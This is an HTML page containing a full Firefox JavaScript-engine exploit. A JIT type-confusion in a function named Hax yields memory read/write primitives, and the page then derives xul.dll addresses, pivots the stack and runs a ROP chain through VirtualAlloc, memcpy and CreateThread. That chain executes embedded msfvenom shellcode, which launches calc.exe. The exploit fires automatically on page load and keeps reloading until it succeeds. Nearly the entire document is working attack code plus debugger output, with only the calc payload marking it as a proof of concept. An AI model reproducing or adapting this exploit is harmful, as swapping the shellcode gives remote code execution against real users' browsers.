<html>
<head>
<script>
function run()
{
    let ab = new ArrayBuffer(0x1000);
    let victim = new Uint8Array(0x1000);
    let rwPrimitive = new Float64Array(0x100);
    let rop = new Float64Array(0x1000);

    //msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f hex
    let shellcode = new Uint8Array(
    [ 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 
    0x65, 0x78, 0x65, 0x00 ]
    );

    var float64 = new Float64Array(1);
    var int32 = new Int32Array(float64.buffer);


    //Trigger the confusion
    for (let i = 0; i < 1000; i++) {
        new Hax(1337, 1, false);
    }
    let obj = new Hax("asdf", 10000000, true);

    // Driver is now a Float64Array whose data pointer points to a Uint8Array.
    let driver = obj.y;


    let ObjectGroup =  driver[8]; //Get address of objectGroup
    float64[0] = ObjectGroup; // clasp_ is used to calculate xul_base
    //prompt("ObjectGroup:", "0x" + SignedDwordToUnsignedDword(int32[1]).toString(16) + "" + SignedDwordToUnsignedDword(int32[0]).toString(16));
    let ObjectGroupUint = SignedDwordToUnsignedDword(int32[0]) + SignedDwordToUnsignedDword(int32[1]) * 0x100000000;


    //Get xul base address
    let clasp_ = readPtr(ObjectGroupUint); //Get address from classp_

    let xulBase = clasp_ - 0x045d50f0;

    float64[0] = driver[23];        //driver[23] holds data buffer pointer of rop object
    let stackRopAddr =  SignedDwordToUnsignedDword(int32[0]) + SignedDwordToUnsignedDword(int32[1]) * 0x100000000;

    float64[0] = driver[35];        //driver[35] holds data buffer pointer of shellcode object
    let shellCodeBufAddr = SignedDwordToUnsignedDword(int32[0]) + SignedDwordToUnsignedDword(int32[1]) * 0x100000000;
    let shellcodeLen = shellcode.length;

    /*get addresses to api calls*/
    let virtualAllocAddr = readPtr(xulBase + 0x04fb3bb0);
    let memcpyAddr = readPtr(xulBase + 0x04FB5528);
    let CreateThreadAddr = readPtr(xulBase + 0x04fb3488);


    /* Stack pointer can be retreived by traversing structure tree attached to array object*/
    /* TypedArrayObject::group_  -> realm_ -> runtime_ -> mainContext_ -> stackRoots_[4] */
    let realm_ = readPtr(ObjectGroupUint + 0x10);
    let runtime_ = readPtr(realm_ + 0x10);
    let mainContext_ = readPtr(runtime_ + 0x50);
    let stackPtr = readPtr(mainContext_ + 0x20);

    /*as a stack Pivot use the code generated by jit for SetElement in xul!js::jit::ICSetElem_Fallback::Compiler::generateStubCode*/ 

    let stackPivotAddr = stackPtr + 0x5c8 - 0x380 + 0x518;   //return from js .

    driver[15] = qword2Float64(stackPivotAddr);              //here we use read directly through rwPrimitive object to keep the stack layout in line with last write
    float64[0] = rwPrimitive[0];
    let originalRet = SignedDwordToUnsignedDword(int32[0]) + SignedDwordToUnsignedDword(int32[1]) * 0x100000000;
    originalRet += 8;

    prepareRop(xulBase, stackRopAddr, shellCodeBufAddr, shellcodeLen, virtualAllocAddr, memcpyAddr, CreateThreadAddr, originalRet);


    stackRopAddr += 0x4000; // point to middle of buffer of rop array. (space for calls)

    driver[15] = qword2Float64(stackPivotAddr);
    rwPrimitive[0] = qword2Float64(stackRopAddr); //replace return address with our rop
/* Stack at the moment of overwrite:
0:000> k
 # Child-SP          RetAddr           Call Site
00 00000073`25bfcad8 00007ffd`f8100308 xul!msgpack_version_revision+0x1ba241
01 00000073`25bfcae0 00007ffd`f80fed10 xul!msgpack_version_revision+0xf5d28
02 00000073`25bfcb40 00007ffd`f80ede05 xul!msgpack_version_revision+0xf4730
03 00000073`25bfcc00 00007ffd`f7f75893 xul!msgpack_version_revision+0xe3825
04 00000073`25bfcd90 00007ffd`f89f0f63 xul!dav1d_set_cpu_flags_mask+0x13ed3
05 00000073`25bfce20 0000029d`feaf619d xul!msgpack_version_minor+0x7c1ba3
06 00000073`25bfd150 0000029d`feb1bce2 0x0000029d`feaf619d
07 00000073`25bfd158 00000000`00000000 0x0000029d`feb1bce2
0:000> u 0000029d`feaf619d
0000029d`feaf619d 4883c438        add     rsp,38h
0000029d`feaf61a1 5c              pop     rsp         <==== Stack Pivot
0000029d`feaf61a2 84c0            test    al,al
0000029d`feaf61a4 0f84861b0000    je      0000029d`feaf7d30
0000029d`feaf61aa 4883c408        add     rsp,8
0000029d`feaf61ae c24800          ret     48h
0000029d`feaf61b1 cc              int     3
0000029d`feaf61b2 f4              hlt
0:000> r rip
rip=00007ffdf81c4821
0:000> r rsp
rsp=0000007325bfcad8
*/
    window.close();
    return;

    /*----------------- tool funcions --------------------------*/

    function Hax(val, l, trigger) {
        // In the final invocation:

        // Ultimately confuse these two objects which each other.
        // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)
        let x = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: []};
        // y is a real ArrayBufferView object.
        let y = new Float64Array(0x1000);

        // * Trigger a conversion of |this| to a NativeObject.
        // * Update Hax's template type to NativeObject with .a and .x (and potentially .y)
        // * Trigger the "roll back" of |this| to a NativeObject with only property .a
        // * Bailout of the JITed code due to type inference changes
        this.a = val;

        // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
        // incorrectly assume that |this| already has the final type (so already has property .x)
        for (let i = 0; i < l; i++) {}

        // The JITed code will now only have a property store here and won't update the Shape.
        this.x = x;

        if (trigger) {
            // This property definition is conditional (and rarely used) so that an inline cache
            // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
            // be put into the same slot as .x, as the Shape of |this| only shows property .a.
            this.y = y;

            // At this point, .x and .y overlap, and the JITed code below believes that the slot
            // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
        }

        // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
        this.x.data = victim;
    }

    function prepareRop(xulBase, ropMemAddr, shellCodeBufAddr, shellcodeLen, virtualAllocAddr, memcpyAddr, CreateThreadAddr, origRet)
    {
        let i = 0x801; //start in the middle of buffer
        let stackBegin = ropMemAddr + (0x801*8);  //address of first instruction in rop object memmory

        let lpAddrargOffset = 0x130 //offset of 
        let lpAddrargOffset2 =  0x1a0//
        let origRetOffset = 0x230 // offset to a placeholder for original return address



    /*VirtualAlloc*/
        rop[i] = qword2Float64(xulBase + 0x7712d);        // nop ; ret
        i += 10; //Due to add rsp, 8 ; ret 48h at the end of DoSetElemFallback;
        rop[i] = qword2Float64(xulBase + 0x9ed8d);  i+=1;   // pop rcx ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                 // lpAddress
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret
        rop[i] = qword2Float64(0x800000);  i+=1;              // dwSize
        rop[i] = qword2Float64(xulBase + 0x7232d1);  i+=1;  // pop r8 ; ret
        rop[i] = qword2Float64(0x3000);  i+=1;              // flAllocationType = MEM_RESERVE | MEM_COMMIT (0x3000) 
        rop[i] = qword2Float64(xulBase + 0x3ae72b);  i+=1;  // pop r9 ; ret
        rop[i] = qword2Float64(0x40);  i+=1;                // flProtect = PAGE_EXECUTE_READWRITE 
        rop[i] = qword2Float64(virtualAllocAddr);  i+=1;    // VirtualAlloc addr
        rop[i] = qword2Float64(xulBase + 0x8d675c);  i+=1;  // add rsp, 0x20 ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                // shadow args
        rop[i] = qword2Float64(0x0 );  i+=1;             // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;              // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args
    /*rax holds allocated buff addr*/

    /*put alocated memory address as argument for offset calculation from */
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret  
        rop[i] = qword2Float64(stackBegin + lpAddrargOffset - 0x28);  i+=1;       //
        rop[i] = qword2Float64(xulBase + 0x3d37e7e);  i+=1; // mov qword ptr [rdx + 0x28], rax ; ret


    /*memcpy*/
        rop[i] = qword2Float64(xulBase + 0x3fc57e9);  i+=1; // mov rcx, rax ; mov rax, rcx ; ret  dst
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret
        rop[i] = qword2Float64(shellCodeBufAddr );  i+=1;   //src
        rop[i] = qword2Float64(xulBase + 0x7232d1);  i+=1;  // pop r8 ; ret
        rop[i] = qword2Float64(shellcodeLen);  i+=1;        // size
        rop[i] = qword2Float64(memcpyAddr);  i+=1;
        rop[i] = qword2Float64(xulBase + 0xc549df);  i+=1;  // add rsp, 0x18 ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                 //shadow args (ignore)
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args 
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args


        rop[i] = qword2Float64(xulBase + 0x17f5fc9); i+=1;  // pop rax ; ret
        rop[i] = qword2Float64(0x41414141);  i+=1;          // address of allocated memmory => overwritten after VirtAlloc
        rop[i] = qword2Float64(xulBase + 0x9ed8d);  i+=1;   // pop rcx ; ret
        rop[i] = qword2Float64(xulBase + 0x163a779);  i+=1; // address after tramploine code (add rdx, rcx ; jmp rdx)
        rop[i] = qword2Float64(xulBase + 0x4465d72);  i+=1; // sub rax, rcx ; ret

        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret  
        rop[i] = qword2Float64(stackBegin + lpAddrargOffset2 - 0x28);  i+=1;       //
        rop[i] = qword2Float64(xulBase + 0x3d37e7e);  i+=1; // mov qword ptr [rdx + 0x28], rax ; ret



    /*CreateThread*/
        rop[i] = qword2Float64(xulBase + 0x9ed8d);  i+=1;   // pop rcx ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                 // lpThreadAttributes 
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                 // dwStackSize
        rop[i] = qword2Float64(xulBase + 0x7232d1);  i+=1;  // pop r8 ; ret
        rop[i] = qword2Float64(xulBase + 0x163a779);  i+=1; // lpStartAddress => address of trampoline code (add rdx, rcx ; jmp rdx)
        rop[i] = qword2Float64(xulBase + 0x3ae72b);  i+=1;  // pop r9 ; ret
        rop[i] = qword2Float64(0x46464646);  i+=1;          // lpParameter => overwriten after offset from trampoline calculation
        rop[i] = qword2Float64(CreateThreadAddr);  i+=1;    // VirtualAlloc addr
        rop[i] = qword2Float64(xulBase + 0x11def01);  i+=1; // add rsp, 0x30 ; ret
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;                 // shadow args
        rop[i] = qword2Float64(0x0);  i+=1;                 // dwCreationFlags
        rop[i] = qword2Float64(0x0);  i+=1;                 // lpThreadId



    /*go back to normal execution flow*/

    /*pick up the original return from original stack */
        rop[i] = qword2Float64(xulBase + 0x17f5fc9); i+=1;  // pop rax ; ret
        rop[i] = qword2Float64(origRet); i+=1;              // original return Addr address on original stack
        rop[i] = qword2Float64(xulBase + 0x3fc599b);  i+=1; // mov rax, qword ptr [rax] ; ret
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret
        rop[i] = qword2Float64(stackBegin + origRetOffset - 0x28);  i+=1; // offset to placeholder for an original ret
        rop[i] = qword2Float64(xulBase + 0x3d37e7e);  i+=1; // mov qword ptr [rdx + 0x28], rax ; ret

    /*set ret value to true*/
        rop[i] = qword2Float64(xulBase + 0x17f5fc9); i+=1;  // pop rax ; ret
        rop[i] = qword2Float64(0x01); i+=1;                 // 

        rop[i] = qword2Float64(xulBase + 0x3ae72b);  i+=1;  // pop r9 ; ret
        rop[i] = qword2Float64(0x43434343);  i+=1;          // placeholder for an original return value back to normal execution flow
        rop[i] = qword2Float64(xulBase + 0x1c83f2);  i+=1;  // pop rdx ; ret
        rop[i] = qword2Float64(origRet - 0x48);  i+=1;      // allign stack ptr for ret 0x98 (originally att the end of DoSetElemFallback there is ret 0x48 thats why - 0x48)
        rop[i] = qword2Float64(xulBase + 0x3e05846);  i+=1; // mov qword ptr [rdx], r9 ; ret
        rop[i] = qword2Float64(xulBase + 0x22746e0);  i+=1; // pop rsp ; ret 0x98
        rop[i] = qword2Float64(origRet - 0x48);  i+=1;

    }

    function readPtr(addr)
    {
        int32[0] = addr & 0xFFFFFFFF;
        int32[1] = (addr / 0x100000000) & 0xFFFFFFFF;
        driver[15] = float64[0]; //replace data pointer of rwPrimitive object

        float64[0] = rwPrimitive[0];
        return ( SignedDwordToUnsignedDword(int32[0]) + SignedDwordToUnsignedDword(int32[1]) * 0x100000000 );

    }

    function SignedDwordToUnsignedDword(sd)
    {
        return (sd < 0) ? sd + 0x100000000 : sd;
    }

    function qword2Float64(val)
    {
        int32[0] = val & 0xFFFFFFFF;
        int32[1] = (val / 0x100000000) & 0xFFFFFFFF;
        return float64[0]; 
    }

}

</script>
</head>
<body>
<h1> Test ...</h1>
<script type="text/javascript">
    window.addEventListener('load', (event) => {
        try{
            run();          //if it didn't work reload the page 
        }                   //(sometimes the confusion does not get triggeret on first load)
        catch (error) {}
        finally{
            location.reload();
        }
    });

</script>
</body>
</html>
